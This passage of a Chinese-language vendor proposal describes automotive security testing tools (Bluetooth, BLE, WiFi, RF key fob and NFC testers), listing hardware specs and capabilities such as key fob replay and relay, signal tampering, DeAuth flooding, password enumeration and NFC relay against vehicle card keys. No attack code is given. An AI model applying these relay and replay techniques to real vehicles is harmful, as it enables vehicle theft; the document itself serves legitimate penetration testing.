alt="1703167887191"></p><ol><li>支持高阶功能包含蓝牙（经典/低功耗）嗅探等；</li><li>支持测试对象进行新增、删除、修改或对已有测试对象的搜索；</li><li>支持任务管理页面中可以对测试任务新增、编辑、删除、搜索、配置用例、开始检测、查看结果；</li><li>支持测试对象与测试任务相关联、一个测试对象可以对应多个测试任务；</li><li>支持对测试过程中产生的测试数据、操作日志的显示与导出；</li><li>支持测试报告的导出，导出格式为pdf，测试报告应对不通过的测试用例提出修复建议；</li><li>工具采用B/S设计架构，并采用SSL加密通信方式，用户可以通过浏览器远程方便的进行管理。</li></ol><p>性能参数要响应下：</p><ol><li>采用3×3 MU-MIMO设计，外置3根5db全向天线</li><li>电源电压，100~240V AC，50/60Hz（内置通用电源）。</li></ol><h2 id="蓝牙协议分析工具"><a href="#蓝牙协议分析工具" class="headerlink" title="蓝牙协议分析工具"></a>蓝牙协议分析工具</h2><h3 id="工具概述-1"><a href="#工具概述-1" class="headerlink" title="工具概述"></a>工具概述</h3><p>蓝牙协议分析工具可以支持蓝牙信令测试及所有odeRF指标测试，内置信号源和干扰源，进行更多标准测试。</p><h3 id="工具方案-1"><a href="#工具方案-1" class="headerlink" title="工具方案"></a>工具方案</h3><h4 id="硬件方案-1"><a href="#硬件方案-1" class="headerlink" title="硬件方案"></a>硬件方案</h4><p>蓝牙版本支持：选择硬件模块和芯片，确保全面支持蓝牙BT5.0及以下版本。</p><p>RF指标测试支持：设计相应的电路和接口，以支持对蓝牙的所有RF指标进行测试。</p><p>内置信号源和干扰源：在硬件中集成信号源和干扰源，以进行更多标准测试，如功率测试、频谱分析等。</p><p>测试覆盖配置：提供全面的测试覆盖配置选项，使用户能够根据需要自定义测试参数。</p><h4 id="软件方案-1"><a href="#软件方案-1" class="headerlink" title="软件方案"></a>软件方案</h4><p>前端设计：</p><p>用户界面：设计简单直观的用户界面，使用户能够轻松进行操作和配置。</p><p>测试配置：提供配置选项，包括选择蓝牙版本、设置测试参数、选择测试覆盖范围等。</p><p>测试控制：实现启动测试、停止测试、暂停测试等控制功能。</p><p>测试结果展示：以图表、表格等形式展示测试结果，包括蓝牙信令分析、RF指标测试结果等。</p><p>后端设计：</p><p>数据处理：接收前端发送的测试配置和控制指令，处理数据并生成测试结果。</p><p>蓝牙信令解析：实现蓝牙信令的解析功能，将蓝牙设备之间的通信流量进行解析和分析。</p><p>RF指标测试：设计相应的算法和逻辑，对蓝牙的各项RF指标进行测试和评估。</p><p>数据存储：将测试结果和相关数据存储到数据库或文件中，以便后续查询和导出。</p><p>USB读取测试脚本：</p><p>设计USB接口的读取功能，以支持从外部设备读取测试脚本。</p><p>解析测试脚本：对读取的测试脚本进行解析，提取测试配置和参数。</p><p>自动化测试：根据测试脚本中的配置和参数，自动执行相应的测试流程。</p><p>用户权限和安全：</p><p>用户身份验证：实现用户身份验证机制，确保只有授权用户可以访问和使用工具。</p><p>用户权限管理：设置不同的用户权限，限制用户对工具的操作和访问范围。</p><p>安全性考虑：在开发过程中，注重安全性，防止潜在的安全漏洞和攻击。</p><p>扩展性和可维护性：</p><p>扩展性：设计具有良好扩展性的架构，以方便后续添加新的功能模块和测试功能。</p><p>可维护性：采用合适的编程规范和设计模式，使代码易于维护和修改。</p><h4 id="工具功能-1"><a href="#工具功能-1" class="headerlink" title="工具功能"></a>工具功能</h4><p>蓝牙信令测试：实现蓝牙信令的解析和分析功能，以捕获和分析蓝牙设备之间的通信流量。</p><p>操作界面设计：设计简单直观的软件操作界面，使用户能够轻松进行测试配置、启动测试和查看测试结果。</p><p>USB接口支持：提供USB接口，以便用户可以通过USB读取测试脚本，方便测试流程的自动化和批量测试。</p><p>内置信号源和干扰源，进行更多标准测试，支持蓝牙BT5.0及蓝牙所有RF指标测试。</p><h3 id="产品彩页-9"><a href="#产品彩页-9" class="headerlink" title="产品彩页"></a>产品彩页</h3><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/2fc4786493f6255f6ac169653a5f0669.png"></p><h3 id="工具参数-1"><a href="#工具参数-1" class="headerlink" title="工具参数"></a>工具参数</h3><p>功能参数如下：</p><p>我司为本项目提供的该产品信息如下：</p><p>品牌：国利</p><p>型号：GLBTxy226</p><p>数量：2套</p><p>指标参数信息如下：</p><ol><li>全面支持蓝牙BT5.0；</li><li>支持蓝牙所有RF指标测试；</li><li>内置信号源和干扰源，进行更多标准测试；</li><li>全配置测试覆盖；</li><li>支持蓝牙信令测试；</li><li>简单直观的软件操作界面；</li><li>可通过USB读取测试脚本。</li></ol><p>性能参数如下：</p><p>1)启动时间不超过2秒。</p><h3 id="蓝牙BLE检测工具"><a href="#蓝牙BLE检测工具" class="headerlink" title="蓝牙BLE检测工具"></a>蓝牙BLE检测工具</h3><h4 id="工具概述-2"><a href="#工具概述-2" class="headerlink" title="工具概述"></a>工具概述</h4><p>蓝牙BLE属于近场通讯协议，是无线通信协议中的一种，它被广泛用于手机、便携式设备、物联网等领域，能够提供轻松、安全、迅速的通信，蓝牙BLE的配对机制也保证了一定的安全性。</p><h4 id="工具方案-2"><a href="#工具方案-2" class="headerlink" title="工具方案"></a>工具方案</h4><h5 id="硬件方案-2"><a href="#硬件方案-2" class="headerlink" title="硬件方案"></a>硬件方案</h5><p>BLE信号检测：采用高灵敏度的蓝牙芯片（如NRF52832）和天线设计，支持检测BLE蓝牙设备的无线信号。SWR3301B蓝牙适配器，标准CSR芯片适配。</p><p>数据采集和存储：设计数据采集模块，能够随时监控和分析蓝牙数据包，并将数据存储在本地存储器或内置存储卡中。</p><p>通信接口支持：提供4G网络、Wi-Fi和以太网连接选项，以便传输数据到云端或其他设备。</p><p>数据上传方式：支持WebSocket、MQTT、HTTP三种数据上传方式，使用户可以根据需求选择合适的上传方式。</p><p>其他硬件：树莓派4b处理器，四个ARM Cortex-A72核心，默认时钟频率1.5Ghz。设计两节18650可充电电池供电，micro usb充电口。</p><h5 id="软件方案-2"><a href="#软件方案-2" class="headerlink" title="软件方案"></a>软件方案</h5><p>前端设计：</p><p>用户界面：设计直观易用的用户界面，包括设备列表、数据包监控窗口、配置选项等。</p><p>设备扫描：提供设备扫描功能，显示附近可用的BLE设备列表，并显示设备的基本信息。</p><p>数据包监控：实时显示捕获到的蓝牙数据包，包括广播数据、GATT服务等，并提供过滤和排序选项。</p><p>配置选项：允许用户配置扫描参数、过滤条件、数据上传方式等。</p><p>后端设计：</p><p>BLE设备管理：实现BLE设备的连接和断开功能，监测设备连接状态，并提供设备信息的获取和展示。</p><p>数据包分析：解析捕获到的蓝牙数据包，提取关键信息并以可读形式展示，方便用户分析数据交换流程。</p><p>BLE数据类型扫描：支持扫描多种BLE数据类型，如广播数据、GATT服务等，以提供更全面的监测和分析。</p><p>RSSI过滤：根据用户设定的RSSI阈值，过滤掉距离过远或过近的BLE设备，以便集中关注特定距离范围内的设备。</p><p>数据上传：支持MQTT、HTTP和WebSocket三种数据上传方式，将捕获到的数据传输到云端或其他设备。</p><p>数据存储和导出：</p><p>数据存储：将捕获到的蓝牙数据包和相关信息存储在本地数据库或文件中，以便后续查询和分析。</p><p>数据导出：提供数据导出功能，允许用户将数据以文件或其他格式导出，方便进一步处理和共享。</p><p>用户权限和安全：</p><p>用户身份验证：实现用户身份验证机制，确保只有授权用户可以访问和使用工具。</p><p>用户权限管理：设置不同的用户权限，限制用户对工具的操作和访问范围。</p><p>安全性考虑：在开发过程中，注重安全性，防止潜在的安全漏洞和攻击。</p><p>网络连接和通信：</p><p>支持4G网络、Wi-Fi和以太网连接选项，以便传输数据到云端或其他设备。</p><p>实现MQTT、HTTP和WebSocket等通信协议，以支持数据上传和远程控制。</p><h5 id="工具功能-2"><a href="#工具功能-2" class="headerlink" title="工具功能"></a>工具功能</h5><p>BLE设备监控管理：实现对蓝牙BLE设备的监控管理功能，包括设备扫描、连接状态监测、设备信息展示等。</p><p>数据包分析：实现对蓝牙数据包的监控和分析功能，方便分析车辆BLE通信流程和蓝牙解锁的详细数据交换流程。</p><p>BLE数据类型扫描：支持扫描多种BLE数据类型，如广播数据、GATT服务等。</p><p>RSSI过滤：支持通过RSSI（接收信号强度指示）进行过滤，以筛选特定距离范围内的BLE设备。</p><p>多设备广播信息读取：支持同时读取多个BLE设备的广播信息，以提供更全面的监测和分析。</p><p>数据上传：实现数据上传功能，支持通过MQTT、HTTP和WebSocket将数据传输到云端或其他设备。</p><p>数据采集距离和时间：确保在10米范围内进行数据采集，并保证采集时间不超过10分钟。</p><p>解锁信号发送距离：保证解锁信号的发送距离不超过50米。</p><p>蓝牙工作频率：支持2402-2480MHz的蓝牙工作频率范围，以及2.4GHz的Wi-Fi频段。</p><p>能效设计：优化硬件设计，确保低功耗和高效能运行。</p><p>供电方式：支持5V/2A的Micro USB供电或POE以太网供电方式。</p><p>天线设计：采用板载PCB天线设计，以提供稳定的Wi-Fi连接。</p><h4 id="产品彩页-10"><a href="#产品彩页-10" class="headerlink" title="产品彩页"></a>产品彩页</h4><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/28bcb2b2ead05ca421147f2ec8c426a0.png"></p><h4 id="工具参数-2"><a href="#工具参数-2" class="headerlink" title="工具参数"></a>工具参数</h4><p>功能参数如下：</p><ol><li>支持检测BLE蓝牙设备无线信号；</li></ol><p>2)支持监控蓝牙数据包，方便分析车辆BLE通信流程；</p><p>3)支持通过RSSI过滤和排序；</p><p>4)支持4G网络传输，传输网络带宽&gt;=10M；</p><p>5)汽车蓝牙服务扫描&lt;2米，扫描采集蓝牙数据时间&lt;2分钟；</p><p>6)主机端距手机&lt;5米(实际距离收手机蓝牙信号强度影响)；</p><p>7)远程端距车&lt;2米；</p><p>8)配置SWR3301B蓝牙适配器，标准CSR芯片；</p><p>9)配置树莓派4b处理器，四个ARM Cortex-A72核心，默认时钟频率1.5Ghz；</p><p>10)自带两节18650可充电电池供电，micro usb充电口。</p><h3 id="WIFI安全测试工具"><a href="#WIFI安全测试工具" class="headerlink" title="WIFI安全测试工具"></a>WIFI安全测试工具</h3><h4 id="工具概述-3"><a href="#工具概述-3" class="headerlink" title="工具概述"></a>工具概述</h4><p>WIFI安全测试工具通过全面模拟WIFI应用的各种行为，自动抓取与被测WIFI设备的通信数据包，结合自身完善的检测能力和权威的漏洞库进行有效扫描，可识别出数据是否加密及数据加密算法等。</p><h4 id="工具方案-3"><a href="#工具方案-3" class="headerlink" title="工具方案"></a>工具方案</h4><h5 id="硬件方案-3"><a href="#硬件方案-3" class="headerlink" title="硬件方案"></a>硬件方案</h5><p>外观设计：工具采用便携式设计，轻巧的外壳，易于携带，耐用的材料制成，外形美观且符合人体工程学。</p><p>网络接口：设备配备1个RJ45网络接口，支持10M/100M/1000M自适应以太网，确保与外部网络的高速连接。</p><p>无线设计：采用2.4GHz和5GHz双频无线设计，支持802.11a/b/g/n/ac无线协议，确保与各种无线设备的兼容性。</p><p>MU-MIMO技术：采用3×3 MU-MIMO技术，外置3根5db全向天线，提高无线覆盖范围和信号稳定性。</p><p>电源设计：内置通用电源适配器，支持100~240V AC，50/60Hz，适应全球不同地区的电源标准。</p><h5 id="软件方案-3"><a href="#软件方案-3" class="headerlink" title="软件方案"></a>软件方案</h5><p>WiFi安全测试工具的软件核心采用模块化设计，每个模块负责不同的测试和分析任务。软件基于B/S架构开发，后端采用高性能的服务器端语言，如Go或Node.js，以处理并发请求和执行复杂的安全测试算法。前端使用现代的Web开发技术栈，如React或Vue.js，以提供动态和响应式的用户界面。</p><p>前端设计：</p><p>用户界面：采用现代化、直观的用户界面设计，使用户能够方便地进行操作和管理。</p><p>功能模块：将功能模块划分为不同的页面或组件，例如测试对象管理、测试任务管理、测试结果查看等。</p><p>用户权限和安全：实现用户认证和授权机制，根据用户角色分配不同的权限，确保系统安全性。</p><p>后端设计：</p><p>架构选择：采用B/S架构，使用流行的Web开发框架，如Django、Flask等，以实现后端逻辑和数据管理。</p><p>数据库设计：设计合适的数据库结构来存储测试对象、测试任务、测试数据和日志等信息。</p><p>API设计：定义合适的API接口，用于前端与后端之间的数据交互和通信。</p><p>业务逻辑：实现测试对象的新增、删除、修改和搜索功能，测试任务的新增、编辑、删除、搜索、配置用例、开始检测和查看结果功能等。</p><p>数据导出和报告：</p><p>测试数据导出：提供导出测试过程中产生的测试数据的功能，可以导出为常见的数据格式，如CSV、Excel等，以便后续分析和处理。</p><p>测试报告生成：根据测试结果自动生成测试报告，包括测试用例的执行情况、不通过的测试用例列表和修复建议等，导出格式为PDF，确保报告的可读性和易于分享。</p><p>用户权限和安全：</p><p>用户认证：实现用户注册、登录和注销功能，确保只有授权用户可以访问系统。</p><p>用户角色和权限管理：定义不同的用户角色，如管理员、普通用户等，根据角色分配不同的权限，以控制用户对系统的操作和访问范围。</p><p>数据安全：在安全通信方面，我司采用了SSL的方式进行了加密通信，这是为了保障安全的进行数据传输</p><h5 id="工具功能-3"><a href="#工具功能-3" class="headerlink" title="工具功能"></a>工具功能</h5><p>车载WIFI测试：支持对车载WIFI设备的AP模式和STA模式进行安全测试，包括界面截图展示。</p><p>认证机制检测：检测WIFI接入认证机制的安全性，包括密码强度和认证协议。</p><p>端口开放检测：检测WIFI接入设备的端口开放情况，识别潜在的安全风险。</p><p>拒绝服务攻击检测：模拟DoS攻击，评估WIFI设备的抵抗能力。</p><p>密码枚举检测：检测WIFI网络对密码枚举攻击的抵抗能力。</p><p>DeAuth泛洪攻击检测：检测WIFI网络对DeAuth泛洪攻击的敏感性。</p><p>认证类型检测：检测WIFI网络中使用的不安全认证类型。</p><p>钓鱼攻击检测：模拟钓鱼攻击，检测WIFI网络的安全性。</p><p>明文传输检测：检测WIFI网络中的明文传输问题。</p><p>WIFI漏洞检测：针对列出的CVE漏洞进行检测。</p><p>高阶功能：包括WIFI嗅探、开启WIFI热点等功能。</p><p>测试对象管理：支持对测试对象进行新增、删除、修改或搜索。</p><p>任务管理：在任务管理页面中对测试任务进行管理，包括用例配置、检测启动和结果查看。</p><p>测试数据导出：支持测试过程中产生的测试数据和操作日志的显示与导出。</p><p>测试报告：生成详细的PDF格式测试报告，并对不通过的测试用例提出修复建议。</p><p>用户界面和远程管理</p><p>B/S架构：用户通过浏览器访问工具管理界面，无需安装额外软件。</p><p>SSL加密：在安全通信方面，我司采用了SSL的方式进行了加密通信，这是为了保障安全的进行数据传输。</p><h4 id="产品彩页-11"><a href="#产品彩页-11" class="headerlink" title="产品彩页"></a>产品彩页</h4><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/e9e7b451eedaced6eee5acb17829a997.png"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/79733564dc8d46b8f6586b58d79b152c.png"></p><h4 id="工具参数-3"><a href="#工具参数-3" class="headerlink" title="工具参数"></a>工具参数</h4><p>功能参数如下：</p><p>我司为本项目提供的该产品信息如下：</p><p>品牌：国利</p><p>型号：GLwifi4/5L</p><p>数量：2套</p><p>指标参数信息如下：</p><ol><li>外观采用便携式设计；</li><li>支持1路10M/100M/1000M自适应以太网</li><li>2.4G和5G双频设计，支持802.11a/b/g/n/ac协议</li><li>支持对车载WIFI设备的AP模式和STA模式进行安全测试；功能的界面截图如下所示：</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/8ee0e43898d913146157d3256c79c747.png"></p><ol><li>支持WIFI接入认证机制检测；</li><li>支持WIFI接入设备端口开放检测；</li><li>支持WIFI拒绝服务攻击检测；</li><li>支持WIFI密码枚举检测；</li><li>支持WIFI DeAuth泛洪攻击检测；</li><li>支持WIFI不安全认证类型检测；</li><li>支持WIFI 钓鱼攻击检测；</li><li>支持WIFI 明文传输检测；</li><li>支持WIFI漏洞检测，包含CVE_2021_34173、CVE-2020-11914、CVE-2020-11908、CVE-2020-11913、CVE-2020-11912、CVE-2020-11898、CVE-2020-11902、CVE-2020-11911、CVE_2021_34174、CVE-2020-11910、CVE-2020-11909、CVE-2020-11907、CVE-2020-11906、CVE-2020-11905、CVE-2020-11903、CVE-2020-11899、CVE-2020-11904、CVE-2020-11900、CVE-2020-11901、CVE-2020-11897、CVE-2020-11896等；已提供相关视频佐证，视频链接：<a href="https://pan.baidu.com/s/188QF5S2Nd9lYXTAl1big9A?pwd=c1ix">https://pan.baidu.com/s/188QF5S2Nd9lYXTAl1big9A?pwd=c1ix</a> 。提取码：c1ix。</li><li>支持高阶功能包含WIFI嗅探、开启WIFI热点等；</li><li>支持测试对象进行新增、删除、修改或对已有测试对象的搜索；</li><li>支持任务管理页面中可以对测试任务新增、编辑、删除、搜索、配置用例、开始检测、查看结果；</li><li>支持测试对象与测试任务相关联、一个测试对象可以对应多个测试任务；</li><li>支持对测试过程中产生的测试数据、操作日志的显示与导出；</li><li>支持测试报告的导出，导出格式为pdf，测试报告应对不通过的测试用例提出修复建议；</li><li>工具采用B/S设计架构，并采用SSL加密通信方式，用户可以通过浏览器远程方便的进行管理；</li></ol><p>性能参数如下：</p><ol><li>采用3×3 MU-MIMO设计，外置3根5db全向天线</li><li>电源电压，100~240V AC，50/60Hz（内置通用电源）。</li></ol><h3 id="射频钥匙安全测试工具"><a href="#射频钥匙安全测试工具" class="headerlink" title="射频钥匙安全测试工具"></a>射频钥匙安全测试工具</h3><h4 id="工具概述-4"><a href="#工具概述-4" class="headerlink" title="工具概述"></a>工具概述</h4><p>射频钥匙安全测试工具是对射频钥匙信息安全进行测试的专项工具，帮助渗透测试人员与汽车射频钥匙测试人员快速对车端的射频钥匙安全通信安全进行测试，生成测试报告，并给相对应的修复建议。</p><h4 id="工具方案-4"><a href="#工具方案-4" class="headerlink" title="工具方案"></a>工具方案</h4><h5 id="硬件方案-4"><a href="#硬件方案-4" class="headerlink" title="硬件方案"></a>硬件方案</h5><p>外观设计：采用便携式设计，方便携带和使用。</p><p>以太网接口：支持1路10M/100M/1000M自适应以太网接口，用于连接到被测试的网络设备。</p><p>中继设备：提供两个便携式中继设备，用于测试射频信号中继功能。</p><p>射频钥匙天线：支持汽车射频钥匙125K/315M/433M/868M/915M天线的适配和外接延长线，以满足不同频率的测试需求。</p><p>射频钥匙安全功能：支持汽车射频钥匙重放、中继、拒绝服务、信号逆向分析和信号篡改等安全测试功能。</p><p>高阶功能支持：支持对汽车射频信号的实时录制等高级功能，以提供更全面的测试能力。</p><h5 id="软件方案-4"><a href="#软件方案-4" class="headerlink" title="软件方案"></a>软件方案</h5><p>前端设计：</p><p>用户界面：采用现代化、直观的用户界面设计，使用户能够方便地进行操作和管理。</p><p>功能模块：将功能模块划分为不同的页面或组件，例如测试对象管理、测试任务管理、测试结果查看等。</p><p>用户权限和安全：实现用户认证和授权机制，根据用户角色分配不同的权限，确保系统安全性。</p><p>后端设计：</p><p>架构选择：采用B/S架构，使用流行的Web开发框架，如Django、Flask等，以实现后端逻辑和数据管理。</p><p>数据库设计：设计合适的数据库结构来存储测试对象、测试任务、测试数据和日志等信息。</p><p>API设计：定义合适的API接口，用于前端与后端之间的数据交互和通信。</p><p>业务逻辑：实现测试对象的新增、删除、修改和搜索功能，测试任务的新增、编辑、删除、搜索、配置用例、开始检测和查看结果功能等。</p><p>数据导出和报告：</p><p>测试数据导出：提供导出测试过程中产生的测试数据的功能，可以导出为常见的数据格式，如CSV、Excel等，以便后续分析和处理。</p><p>测试报告生成：根据测试结果自动生成测试报告，包括测试用例的执行情况、不通过的测试用例列表和修复建议等，导出格式为PDF，确保报告的可读性和易于分享。</p><p>用户权限和安全：</p><p>用户认证：实现用户注册、登录和注销功能，确保只有授权用户可以访问系统。</p><p>用户角色和权限管理：定义不同的用户角色，如管理员、普通用户等，根据角色分配不同的权限，以控制用户对系统的操作和访问范围。</p><p>数据安全：在安全通信方面，我司采用了SSL的方式进行了加密通信，这是为了保障安全的进行数据传输</p><h5 id="工具功能-4"><a href="#工具功能-4" class="headerlink" title="工具功能"></a>工具功能</h5><p>用户界面：设计基于浏览器的用户界面，采用B/S架构，用户可以通过浏览器远程管理工具。</p><p>SSL加密通信：采用SSL加密通信方式，确保通信安全性。</p><p>测试对象管理：支持新增、删除、修改和搜索测试对象，方便管理和配置测试任务。</p><p>测试任务管理：支持新增、编辑、删除、搜索、配置用例、开始检测和查看结果等测试任务管理功能。</p><p>测试数据与日志：支持显示和导出测试过程中产生的测试数据和操作日志，以便后续分析和审查。</p><p>测试报告导出：支持将测试结果导出为PDF格式的测试报告，对不通过的测试用例提出修复建议。</p><p>测试对象与测试任务关联：支持将测试对象与测试任务相关联，一个测试对象可以对应多个测试任务，方便管理和执行测试任务。</p><p>射频天线适配：工具支持多种射频频段（125KHz, 315MHz, 433MHz, 868MHz, 915MHz），以适配不同车辆的射频钥匙，并可通过外接延长线增加灵活性。</p><p>射频钥匙重放：能够捕获汽车射频钥匙信号，并进行重放，以测试车辆对重放攻击的抵抗能力。</p><p>射频钥匙中继：支持射频钥匙信号的中继功能，可以测试车辆对中继攻击的敏感性。</p><p>射频钥匙拒绝服务：模拟对汽车射频钥匙的拒绝服务攻击，以评估车辆的应对措施。</p><p>信号逆向分析：工具支持对捕获的射频钥匙信号进行逆向分析，以揭示信号的结构和潜在的安全弱点。</p><p>信号篡改：支持对射频钥匙信号进行篡改，以测试车辆系统对异常信号的响应。</p><p>实时录制高阶功能：提供实时录制汽车射频信号的高级功能，用于深入分析和测试。</p><p>测试对象管理：允许用户对测试对象进行新增、删除、修改和搜索，方便管理不同的测试场景。</p><p>任务管理：在任务管理页面，用户可以对测试任务进行新增、编辑、删除、搜索、配置用例、开始检测和查看结果。</p><p>测试对象与测试任务关联：支持将一个测试对象关联到多个测试任务，实现灵活的测试计划和管理。</p><p>数据和日志管理：提供测试过程中产生的数据和操作日志的实时显示和导出功能。</p><p>测试报告生成：自动化生成PDF格式的测试报告，包括对不通过的测试用例的分析和修复建议。</p><p>远程管理：工具采用B/S架构，用户可以通过浏览器远程管理工具，并通过SSL加密通信保障数据传输安全。</p><h4 id="产品彩页-12"><a href="#产品彩页-12" class="headerlink" title="产品彩页"></a>产品彩页</h4><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/634164b23e62a59f451f69ee5f1a38da.png"></p><h4 id="工具参数-4"><a href="#工具参数-4" class="headerlink" title="工具参数"></a>工具参数</h4><p>功能参数如下：</p><p>我司为本项目提供的该产品信息如下：</p><p>品牌：国利</p><p>型号：GLRFCC</p><p>数量：1套</p><p>指标参数信息如下：</p><ol><li>外观采用便携式设计；</li><li>支持1路10M/100M/1000M自适应以太网；</li><li>提供便携式中继设备2个；</li><li>支持汽车射频钥匙125K/315M/433M/868M/915M天线可适配外接延长线；</li><li>支持汽车射频钥匙重放；</li><li>支持汽车射频钥匙中继；功能的界面截图如下：</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/3eb68b5c5a1ca0717116e894515f58a2.png" alt="IMG_256"></p><ol><li>支持汽车射频钥匙拒绝服务；</li><li>支持汽车射频钥匙信号逆向分析；</li><li>支持汽车射频钥匙信号篡改；</li><li>支持高阶功能包括对汽车射频信号的实时录制等；</li><li>支持测试对象进行新增、删除、修改或对已有测试对象的搜索；</li><li>支持任务管理页面中可以对测试任务新增、编辑、删除、搜索、配置用例、开始检测、查看结果；</li><li>支持测试对象与测试任务相关联、一个测试对象可以对应多个测试任务；</li><li>支持对测试过程中产生的测试数据、操作日志的显示与导出；</li><li>支持测试报告的导出，导出格式为pdf，测试报告应对不通过的测试用例提出修复建议；</li><li>工具采用B/S设计架构，并采用SSL加密通信方式，用户可以通过浏览器远程方便的进行管理。</li></ol><h3 id="NFC安全检测工具"><a href="#NFC安全检测工具" class="headerlink" title="NFC安全检测工具"></a>NFC安全检测工具</h3><h4 id="工具概述-5"><a href="#工具概述-5" class="headerlink" title="工具概述"></a>工具概述</h4><p>NFC属于近场通讯协议，是无线通信协议中的一种，它被广泛用于门禁、公交、地铁出行等领域，能够提供轻松、安全、迅速的通信，NFC协议本身通讯的有效距离&lt;10cm，很短的有效通信距离也保证了一定的安全性。</p><p>本项目通过软硬件结合的NFC中继放大技术，NFC协议安全破解技术，第一能够放大车端NFC卡片钥匙通信距离，第二能够通过中继传输方式，让NFC卡片钥匙在远离车端情况下，实现对NFC协议的安全检测。</p><h4 id="工具方案-5"><a href="#工具方案-5" class="headerlink" title="工具方案"></a>工具方案</h4><h5 id="硬件方案-5"><a href="#硬件方案-5" class="headerlink" title="硬件方案"></a>硬件方案</h5><p>传输距离：设计支持15~20米的两端传输距离，以满足检测需求。</p><p>处理器选择：</p><p>标准X86服务器：选择一台标准的X86服务器作为主控设备，用于处理和分析NFC通信信号。</p><p>处理器：选择乐鑫ESP32芯片作为辅助设备，用于NFC信号的捕捉和传输。</p><p>通信接口：</p><p>WI-FI收发器：集成WI-FI收发器，用于与其他设备进行无线通信。</p><p>基带和协议栈：集成基带和协议栈，用于处理NFC通信协议。</p><p>双模蓝牙：支持双模蓝牙，以便与其他蓝牙设备进行通信。</p><p>外部接口：</p><p>SMA接口：提供SMA接口用于连接外置WIFI天线，以增强无线信号接收能力。</p><p>串口通信接口：提供串口通信接口，用于与其他设备进行有线通信。</p><p>显示屏幕：集成0.96寸蓝色OLED显示屏，用于显示相关信息和操作界面。</p><h5 id="软件方案-5"><a href="#软件方案-5" class="headerlink" title="软件方案"></a>软件方案</h5><p>前端设计：</p><p>用户界面：采用现代化、直观的用户界面设计，使用户能够方便地进行操作和管理。</p><p>功能模块：将功能模块划分为不同的页面或组件，例如测试对象管理、测试任务管理、测试结果查看等。</p><p>用户权限和安全：实现用户认证和授权机制，根据用户角色分配不同的权限，确保系统安全性。</p><p>后端设计：</p><p>架构选择：采用B/S架构，使用流行的Web开发框架，如Django、Flask等，以实现后端逻辑和数据管理。</p><p>数据库设计：设计合适的数据库结构来存储测试对象、测试任务、测试数据和日志等信息。</p><p>API设计：定义合适的API接口，用于前端与后端之间的数据交互和通信。</p><p>业务逻辑：实现测试对象的新增、删除、修改和搜索功能，测试任务的新增、编辑、删除、搜索、配置用例、开始检测和查看结果功能等。</p><p>数据导出和报告：</p><p>测试数据导出：提供导出测试过程中产生的测试数据的功能，可以导出为常见的数据格式，如CSV、Excel等，以便后续分析和处理。</p><p>测试报告生成：根据测试结果自动生成测试报告，包括测试用例的执行情况、不通过的测试用例列表和修复建议等，导出格式为PDF，确保报告的可读性和易于分享。</p><p>用户权限和安全：</p><p>用户认证：实现用户注册、登录和注销功能，确保只有授权用户可以访问系统。</p><p>用户角色和权限管理：定义不同的用户角色，如管理员、普通用户等，根据角色分配不同的权限，以控制用户对系统的操作和访问范围。</p><p>数据安全：在安全通信方面，我司采用了SSL的方式进行了加密通信，这是为了保障安全的进行数据传输</p><h5 id="工具功能-5"><a href="#工具功能-5" class="headerlink" title="工具功能"></a>工具功能</h5><p>NFC信号探测和分析：</p><p>支持NFC近场通讯信号探测技术，能够捕捉和分析NFC通信信号。</p><p>实现NFC通讯的探测、分析和监控的一体化流程，对通信信号进行调制解调和信号分析。</p><p>用户界面：</p><p>设计直观、易用的用户界面，支持观察者模式，可对NFC信号进行统一分析和整理。</p><p>支持数据交换监控可视化输出，以便用户更好地理解和分析数据。</p><p>数据存储和导出：</p><p>支持日志系统，将数据存储为独立文件，方便后续的数据分析和审查。</p><p>提供数据导出功能，可以将数据导出为常见的数据格式，如CSV、Excel等。</p><p>传输距离：保证两端设备之间的传输距离在15到20米范围内，适用于多种测试环境。</p><p>快速中继：确保中继时间少于1分钟，以便快速有效地测试中继攻击的可能性和防御措施。</p><p>内置NFC协议：工具内置特斯拉Model 3等车型所使用的NFC协议，以支持特定车辆的测试需求。</p><p>硬件标配：配备X86架构的台式机或笔记本，乐鑫ESP32微控制器，以及安卓手机应用程序，形成一套完整的测试平台。</p><p>外置WIFI天线与电源：提供SMA接口的外置WIFI天线和3.3V的内置电源，确保稳定的无线连接和电力供应。</p><p>串口通信：具备串口通信接口，方便与其他设备或模块的数据交换和控制。</p><p>日志系统：支持高级日志系统，可以将测试数据存储为独立文件，便于后续的分析和审计。</p><p>NFC探测技术：支持NFC近场通讯信号探测技术，可以捕获和分析NFC通信信号。</p><p>信号调制解调：调制解调车端与NFC卡片之间的通信信号，分析信号组成部分，实现从探测到分析再到监控的一体化NFC通讯流程。</p><p>多款NFC门卡支持：支持捕捉多款NFC门卡的信号，增加了测试工具的适用范围。</p><p>车辆NFC信号捕捉：支持捕捉多款车辆的NFC门卡信号，以测试不同车型的NFC系统安全性。</p><p>观察者模式：支持观察者模式，能够对NFC信号进行统一分析和整理，以便于理解和评估通信内容。</p><p>数据交换监控与可视化：支持数据交换监控的可视化输出，使测试人员能够直观地观察和分析NFC通信过程。</p><h4 id="产品彩页-13"><a href="#产品彩页-13" class="headerlink" title="产品彩页"></a>产品彩页</h4><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/275a011a39c84ff9225ca70ea30c9a06.png"></p><h4 id="工具参数-5"><a href="#工具参数-5" class="headerlink" 